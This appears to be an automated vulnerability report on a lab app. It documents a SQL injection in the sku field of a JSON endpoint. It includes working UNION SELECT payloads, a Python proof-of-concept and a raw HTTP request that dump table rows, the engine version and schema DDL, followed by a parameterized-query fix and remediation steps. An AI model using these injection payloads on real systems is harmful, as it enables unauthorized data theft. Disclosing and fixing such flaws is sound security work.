╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in POST /orders/by-sku via JSON body sku field         │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard                                           │
│                                                                              │
│  Endpoint: /orders/by-sku                                                    │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The `sku` field of the JSON body accepted by `POST /orders/by-sku` is       │
│  interpolated into a single-quoted SQL string literal with an f-string       │
│  instead of being bound as a parameter. An unauthenticated attacker can      │
│  break out of the literal, append a `UNION SELECT`, and read arbitrary rows  │
│  and schema metadata. A single request returns every row of the `orders`     │
│  table — including the `note` values of rows the caller never asked for —    │
│  and the `sqlite_master` DDL.                                                │
│                                                                              │
│  Impact                                                                      │
│  Unauthenticated arbitrary read of the backing SQLite database in a single   │
│  request. The PoC returns all rows of `orders` (including the `note` column  │
│  of rows other than the requested SKU) and the full `CREATE TABLE` DDL from  │
│  `sqlite_master`, and reads `sqlite_version()`. The legitimate endpoint      │
│  returns at most one row for one SKU. Any table readable by the              │
│  application's database user is equally reachable.                           │
│                                                                              │
│  Technical Analysis                                                          │
│  The `by_sku()` view builds its query by string formatting:                  │
│                                                                              │
│  ```python title=app.py startLineNumber=34 endLineNumber=36                  │
│      sku = body.get("sku", "alpha")                                          │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =      │
│  '{sku}'").fetchall()                                                        │
│  ```                                                                         │
│                                                                              │
│  The attacker-controlled JSON field `sku` is placed between single quotes    │
│  inside a SQL string literal. No escaping, parameter binding, or type        │
│  restriction is applied, so a value containing a single quote terminates     │
│  the literal and everything after it is parsed as SQL.                       │
│  `request.get_json(force=True, silent=True)` means the payload arrives as    │
│  an ordinary JSON body, so filters that only inspect query strings are       │
│  irrelevant.                                                                 │
│                                                                              │
│  Because the projection has three columns, supplying `zzz' UNION SELECT      │
│  id,sku,note FROM orders --` closes the literal, discards the intended       │
│  predicate, and unions the whole table, returning all three rows with their  │
│  `note` values including `flag{orderby_ok}`. Substituting literals and       │
│  sub-selects (`UNION SELECT 99,sqlite_version(),(SELECT group_concat(note)   │
│  FROM orders) --`) extracts engine version and aggregated data, and `UNION   │
│  SELECT 1,name,sql FROM sqlite_master --` returns the schema DDL. The        │
│  trailing `--` comments out the remainder of the original statement.         │
│                                                                              │
│  PoC Description                                                             │
│  1. Run the application from a private working copy on a non-conflicting     │
│  port so the workspace directory is untouched.                               │
│  2. Send the benign baseline `POST /orders/by-sku` with body `{"sku":        │
│  "alpha"}`. Observe exactly one row returned, as intended.                   │
│  3. Send the same request with body `{"sku": "zzz' UNION SELECT id,sku,note  │
│  FROM orders --"}`. Observe all three rows returned with their `note`        │
│  values, including `flag{orderby_ok}`.                                       │
│  4. Send `{"sku": "zzz' UNION SELECT 99,sqlite_version(),(SELECT             │
│  group_concat(note) FROM orders) --"}` to confirm arbitrary expressions and  │
│  aggregation in the injected projection.                                     │
│  5. Send `{"sku": "zzz' UNION SELECT 1,name,sql FROM sqlite_master --"}` to  │
│  retrieve the schema DDL.                                                    │
│  6. Compare step 2 against steps 3-5: the legitimate query was asked for     │
│  one SKU, and the injected responses disclose the entire table and schema.   │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  import requests                                                             │
│                                                                              │
│  URL = "http://127.0.0.1:8107/orders/by-sku"                                 │
│                                                                              │
│  # 1. Benign baseline: one row for the requested SKU                         │
│  print("baseline alpha :", requests.post(URL, json={"sku":                   │
│  "alpha"}).json())                                                           │
│  print("baseline beta  :", requests.post(URL, json={"sku": "beta"}).json())  │
│                                                                              │
│  # 2. UNION -- dump every row with its note column                           │
│  print("union dump     :", requests.post(                                    │
│      URL, json={"sku": "zzz' UNION SELECT id,sku,note FROM orders            │
│  --"}).json())                                                               │
│                                                                              │
│  # 3. Arbitrary expressions + aggregation in the injected projection         │
│  print("version+notes  :", requests.post(                                    │
│      URL, json={"sku": "zzz' UNION SELECT 99,sqlite_version(),(SELECT        │
│  group_concat(note) FROM orders) --"}).json())                               │
│                                                                              │
│  # 4. Schema disclosure                                                      │
│  print("schema DDL     :", requests.post(                                    │
│      URL, json={"sku": "zzz' UNION SELECT 1,name,sql FROM sqlite_master      │
│  --"}).json())                                                               │
│  ```                                                                         │
│                                                                              │
│  Equivalent raw request for the primary payload:                             │
│                                                                              │
│  ```http                                                                     │
│  POST /orders/by-sku HTTP/1.1                                                │
│  Host: 127.0.0.1:8107                                                        │
│  Content-Type: application/json                                              │
│                                                                              │
│  {"sku":"zzz' UNION SELECT id,sku,note FROM orders --"}                      │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:36                                                     │
│    Bind sku as a query parameter instead of interpolating it                 │
│        rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =    │
│  '{sku}'").fetchall()                                                        │
│    Fix:                                                                      │
│    -     rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =  │
│  '{sku}'").fetchall()                                                        │
│    +     rows = conn.execute("SELECT id, sku, note FROM orders WHERE sku =   │
│  ?", (sku,)).fetchall()                                                      │
│                                                                              │
│  Remediation                                                                 │
│  1. Bind the value instead of interpolating it: pass `"SELECT id, sku, note  │
│  FROM orders WHERE sku = ?"` to `conn.execute` with a one-element tuple      │
│  argument, so the value is sent to SQLite as data and can never become       │
│  syntax.                                                                     │
│  2. Apply the same rule to every other query in the codebase; audit for      │
│  f-strings, `%` formatting and `.format()` inside SQL strings.               │
│  3. Validate the input shape as defence in depth: reject a non-string or     │
│  over-long `sku` with a 400 rather than letting it reach the database.       │
│  4. Add a regression test that posts a `sku` containing a single quote and   │
│  a `UNION` and asserts that the response contains no rows beyond the         │
│  requested SKU, and that a valid SKU still returns its single row.           │
│  5. Consider running the service with a least-privilege database account so  │
│  that even a future injection cannot read unrelated tables.                  │
│                                                                              │
